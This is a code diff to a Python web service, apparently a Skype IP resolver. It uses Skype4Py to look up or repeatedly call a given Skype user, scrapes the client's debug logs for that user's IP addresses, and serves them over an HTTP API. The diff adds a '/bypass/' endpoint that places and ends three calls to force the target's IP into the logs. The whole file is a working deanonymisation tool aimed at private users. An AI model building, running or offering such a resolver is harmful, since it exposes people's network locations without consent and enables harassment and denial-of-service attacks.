@@ -5,8 +5,10 @@ import time
 import re
 import glob
 
+
 urls = (
-    '/api/(.*)', 'resolve'
+    '/api/(.*)', 'resolve',
+    '/bypass/(.*)', 'bypass',
 )
 
 instance = Skype4Py.Skype()
@@ -15,7 +17,6 @@ instance.Attach()
 def findIpAddresses(skype):
 	ipAddresses = []
 	logs = glob.glob('debug-*.log')
-	print logs
 	for log in logs:
 		lol = re.findall(r".*PresenceManager: .*%s.*-r.*-l"%skype, open(log, 'r').read())
 		for ip in lol:
@@ -32,6 +33,9 @@ def writeToLog(skype, instance=instance):
 	instance.Client.Minimize()
 	return True
 
+def emailToSkype(skype):
+	return
+
 class resolve:
 	def GET(self, skype):
 		web.header('Content-Type', 'application/json')
@@ -45,7 +49,46 @@ class resolve:
 			if len(ipDict['public']) > 0:
 				return json.dumps(ipDict)
 			else:
-				return json.dumps({'error': 'fail', 'success': False})
+				return json.dumps({'error': 'not found', 'success': False})
+		except:
+			return json.dumps({'error': 'fail', 'success': False})
+
+
+def writeBypassToLog(skype, instance=instance):
+	for i in range(3):
+		xd = instance.PlaceCall(skype)
+		time.sleep(2)
+		xd.Finish()
+	return True
+
+def findBypassIpAddresses(skype):
+	ipAddresses = []
+	logs = glob.glob('debug-*.log')
+	for log in logs:
+		lel = re.findall(r"withUser = %s .*\n.*#.*.*\n"%skype, open(log, 'r').read())
+		for ip in lel:
+			ip = re.findall(r"\b[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}\b", ip)
+			for wot in ip:
+				if wot.count('.') < 3 or wot in ipAddresses:
+					continue
+				if " " in wot:
+					wot = wot.split(" ")[1]
+				ipAddresses.append(wot.strip().rstrip())
+	return ipAddresses
+
+class bypass:
+	def GET(self, skype):
+		web.header('Content-Type', 'application/json')
+		try:
+			ipDict = {'public': [], 'error': None, 'success': True}
+			writeBypassToLog(skype)
+			ips = findBypassIpAddresses(skype)
+			for ip in ips:
+				ipDict['public'].append(ip)
+			if len(ipDict['public']) > 0:
+				return json.dumps(ipDict)
+			else:
+				return json.dumps({'error': 'not found', 'success': False})
 		except:
 			return json.dumps({'error': 'fail', 'success': False})
 
